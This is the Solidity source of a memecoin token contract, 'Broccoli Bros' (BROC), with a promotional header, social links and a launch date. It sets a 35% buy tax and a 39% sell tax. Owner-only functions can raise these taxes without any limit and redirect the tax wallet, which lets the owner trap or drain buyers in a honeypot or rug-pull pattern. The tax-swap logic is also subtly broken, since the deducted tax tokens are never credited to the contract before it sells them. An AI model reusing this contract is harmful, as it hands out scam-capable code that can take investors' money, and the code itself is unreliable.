/*

In a vibrant coastal town, the legendary Broccoli Bros ruled the waves and embraced a daring lifestyle. 
They were the epitome of cool and edgy, igniting a revolution of passion for life, freedom, and the thrill of living on the edge. 
With their love for the beach, blazing weed, and appreciation for nature’s magic,
they left a lasting legacy that inspired others to embrace life with unbridled enthusiasm.

https://twitter.com/BroccoliBross
https://t.me/BroccoliBros
Website Ready When Live
FairLaunch July 27th 6:00AM UTC

*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, " multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "new owner is the zero address");
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract ERC20Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFeeWallet;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tax;

    // CHANGE DECIMALS HERE. Ex: 6 instead of 18
    uint8 private constant _decimals = 18;

   //CHANGE TOTAL SUPPLY HERE. Ex: 1000 instead of 1000000000000
    uint256 private constant _totalSupply = 1000000000000 * 10**_decimals;

    //CHANGE TOKEN NAME HERE. Ex: "My Token" instead of "Boom"
    string private constant _name = "Broccoli Bros";

    //CHANGE SYMBOL HERE. Ex: "MTN" instead of "Boom"
    string private constant _symbol = "BROC";

    //CHANGE BUY TAX HERE. Ex: For 10% tax, 10 instead of 5
    uint256 public buyTax = 35;

     //CHANGE SELL TAX HERE. Ex: For 10% tax, 10 instead of 5
    uint256 public sellTax = 39;

    //CHANGE TAX WALLET HERE. Ex: 0x50d2594A7543ca49275A79e673f93A911fe4aE3Y instead of 0x60d2594A7543ca49275A79e673f93A911fe4aFA5
    address public taxWallet = payable(0x71AFa19dcA481207E61a369f76a939B97fAc0454);

    // CHANGE MAX THEY CAN HOLD. Ex: for 10%, 10 instead of 1
    uint256 public MAX_PERCENT = 3;

    //CHANGE ANTI SNIPE TAX % FOR FIRST 3 BLOCKS. Ex: for 100%, 100 instead of 99
    uint256 public BOT_TAX = 85;



    uint256 public MAX_PER_WALLET = _totalSupply * MAX_PERCENT / 100;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;

        
    uint256 private launchBlock;
    uint256 private deadBlock = 3;
    bool private launch = false;


    constructor() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _balance[_msgSender()] = _totalSupply;
        
        _isExcludedFromFeeWallet[_msgSender()] = true;
        _isExcludedFromFeeWallet[address(this)] = true;
        _isExcludedFromFeeWallet[taxWallet] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function updateSellTax(uint256 _newValue) public onlyOwner {
        sellTax = _newValue;
    }

        function updateBuyTax(uint256 _newValue) public onlyOwner {
        buyTax = _newValue;
    }

    function updateMaxPercent(uint256 _newValue) public onlyOwner {
        MAX_PERCENT = _newValue;
    }

    function updateTaxWallet(address _newAddr) public onlyOwner {
        taxWallet = payable(_newAddr);
    }

    function updateBotTax(uint256 _newValue) public onlyOwner {
        BOT_TAX = _newValue;
    }




    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)public override returns (bool){
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"low allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "approve zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        launch = true;
        launchBlock = block.number;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "transfer zero address");
        bool _isBuy = false;
        bool _isSell = false;

        if(to != owner() && to != uniswapV2Pair && to != taxWallet){
            require(_balance[from] + amount < MAX_PER_WALLET, "Amount exceeds max per wallet limits");
        }

        if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {
            _tax = 0;
        } else {
            require(launch, "Wait till launch");
            if (block.number < launchBlock + deadBlock) {_tax=BOT_TAX;} else {
                if (from == uniswapV2Pair) {
                    _tax = buyTax;
                    _isBuy = true;
                } else if (to == uniswapV2Pair) {
                    _tax = sellTax;
                    _isSell = true;
                } else {
                    _tax = 0;
                }
            }
        }

        //transfer tokens
        uint256 taxTokens = (amount * _tax) / 100;
        uint256 transferAmount = amount - taxTokens;

        _balance[from] = _balance[from] - amount;
        _balance[to] = _balance[to] + transferAmount;

        if(_isBuy || _isSell){
            swapTokensForEth(taxTokens);
            payable(taxWallet).transfer(IERC20(uniswapV2Router.WETH()).balanceOf(address(this)));
        }
        

        emit Transfer(from, to, transferAmount);
    }

     function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            taxWallet,
            block.timestamp
        );
    }


    receive() external payable {}
}